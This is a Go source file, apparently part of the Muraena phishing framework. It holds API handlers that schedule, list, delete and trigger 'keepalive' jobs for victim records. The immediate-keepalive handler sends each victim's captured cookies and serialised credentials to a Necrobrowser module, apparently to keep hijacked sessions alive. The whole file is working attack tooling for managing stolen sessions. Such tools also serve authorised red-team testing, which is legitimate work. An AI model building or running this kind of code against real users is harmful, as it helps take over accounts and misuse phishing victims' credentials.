package api

import (
	"encoding/json"
	"net/http"

	"github.com/go-chi/chi/v5"

	"github.com/muraenateam/muraena/core/db"
)

func (s *Server) handleListKeepalives(w http.ResponseWriter, r *http.Request) {
	kas, err := db.GetAllKeepalives()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	out := make([]map[string]interface{}, 0, len(kas))
	for _, k := range kas {
		out = append(out, map[string]interface{}{
			"victimID": k.VictimID, "intervalMin": k.IntervalMin,
			"enabled": k.Enabled == "1", "lastRun": k.LastRun, "nextRun": k.NextRun,
		})
	}
	writeJSON(w, 200, out)
}

func (s *Server) handleCreateKeepalive(w http.ResponseWriter, r *http.Request) {
	var in struct {
		VictimID    string `json:"victimID"`
		IntervalMin int    `json:"intervalMin"`
	}
	if err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.VictimID == "" {
		writeError(w, http.StatusBadRequest, "bad_request", "victimID required")
		return
	}
	if in.IntervalMin <= 0 {
		in.IntervalMin = s.sess.Config().Necrobrowser.Keepalive.Minutes
		if in.IntervalMin <= 0 {
			in.IntervalMin = 10
		}
	}
	if err := db.SetKeepalive(in.VictimID, in.IntervalMin); err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	writeJSON(w, http.StatusCreated, map[string]interface{}{"victimID": in.VictimID, "intervalMin": in.IntervalMin})
}

func (s *Server) handleDeleteKeepalive(w http.ResponseWriter, r *http.Request) {
	if err := db.DeleteKeepalive(chi.URLParam(r, "id")); err != nil {
		writeError(w, http.StatusInternalServerError, "internal", err.Error())
		return
	}
	writeJSON(w, 200, map[string]string{"status": "deleted"})
}

func (s *Server) handleKeepaliveNow(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	v, err := db.GetVictim(id)
	if err != nil {
		writeError(w, http.StatusNotFound, "not_found", err.Error())
		return
	}
	if v.ID == "" {
		writeError(w, http.StatusNotFound, "not_found", "victim not found")
		return
	}
	nb, ok := s.necro()
	if !ok {
		writeError(w, http.StatusServiceUnavailable, "unavailable", "necrobrowser module not loaded")
		return
	}
	credsJSON := "{}"
	if b, err := jsonMarshal(v.Credentials); err == nil {
		credsJSON = string(b)
	}
	go nb.KeepaliveOnce(v.ID, v.Cookies, credsJSON)
	writeJSON(w, http.StatusAccepted, map[string]string{"status": "keepalive-sent", "victim": id})
}
